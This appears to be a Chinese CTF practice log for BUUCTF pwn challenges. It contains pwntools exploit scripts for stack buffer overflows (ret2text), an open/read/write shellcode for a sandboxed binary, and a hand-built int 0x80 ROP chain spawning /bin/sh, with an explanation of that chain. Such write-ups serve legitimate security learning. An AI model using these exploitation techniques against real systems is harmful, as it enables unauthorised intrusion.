# buu刷题记录（41-60题）

## 41 picoctf_2018_buffer overflow 1

***ret2text***

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',29931)
def dbg():
    gdb.attach(p)
    pause()

payload = b'b'*0x28+b'b'*0x4+p32(0x80485CB)
p.sendline(payload)
p.interactive()
```

## 42 jarvisoj_test_your_memory

***ret2text***

别看题上那些有的没的，有个溢出点，有个`system`,还有`cat flag`字符串，直接构造rop

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('node5.buuoj.cn',27254)
def dbg():
    gdb.attach(p)
    pause()

sys = 0x80485C9
flag_addr = 0x80487E0
payload = b'b'*0x13+b'b'*0x4+p32(sys)+p32(flag_addr)
p.sendline(payload)
p.interactive()
```

## 43 [ZJCTF 2019]EasyHeap

施工中

## 44 hitcontraining_uaf

施工中

## 45 pwnable_orw

***沙箱***

就是ban了一些危险的函数，但是以获得flag为目的的话也不需要非得getshell

```python
from pwn import *

context(arch='i386',log_level = 'debug')
p = remote('node5.buuoj.cn',26440)
#p = process('./pwn')

bss = 0x804A060
shellcode = shellcraft.open('flag')
shellcode+=shellcraft.read('eax',bss+100,100)
shellcode+=shellcraft.write(1,bss+100,100)
payload = asm(shellcode)
p.recvuntil('shellcode:')
p.sendline(payload)
#log.info(p.recv())
p.interactive()
```

## 46 picoctf_2018_buffer overflow 2

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#p = process('./pwn')
p = remote('node5.buuoj.cn',28047)
#gdb.attach(p)

payload = b'b'*0x6c+b'b'*0x4+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
p.sendline(payload)
p.interactive()
```

## 47 cmcc_simplerop

***rop***

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#p = process('./pwn')
p = remote('node5.buuoj.cn',29845)
#gdb.attach(p)

read_addr = elf.sym['read']
pop_edx_ecx_ebx = 0x0806e850
binsh = 0x80EB584
int_addr = 0x80493e1	# int 0x80
pop_eax = 0x80bae06

payload = b'b'*0x20+p32(read_addr)+p32(0xdeadbeef)+p32(0)+p32(binsh)+p32(0x8)
payload+=p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_addr)

p.sendline(payload)

p.send('/bin/sh')
p.interactive()
```

### 分析分析

这种纯手工构造ROP还是可以分析分析的

- 首先是系统调用的知识，可以看[这里](https://blog.csdn.net/xiaominthere/article/details/17287965)

  - 省流一下：`int 0x80`就是系统调用（syscall），然后根据`syscall(n)`中n的值执行不同函数，其中`0xb`可以执行`execve`函数

- 接下来构造ROP

  - 先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c

    ![image-20250204214033910](./../polarD&N/images/image-20250204214033910.png)

    > 我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移`0x40-0x24=0x1c`

  - 因为程序中没有`/bin/sh`函数，所以我们需要调用一下`read`函数，以此输入一个`/bin/sh`进去（这里binsh的地址是bss段，因为没开PIE，所以地址所见即所得）

  - 接下来第二行就是进行系统调用了，我们要申请的函数是

    ```c
    int 0x80(0xb,’/bin/sh‘, null, null);
    //对应寄存器eax, ebx,	 ecx,  edx
    ```

    这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好
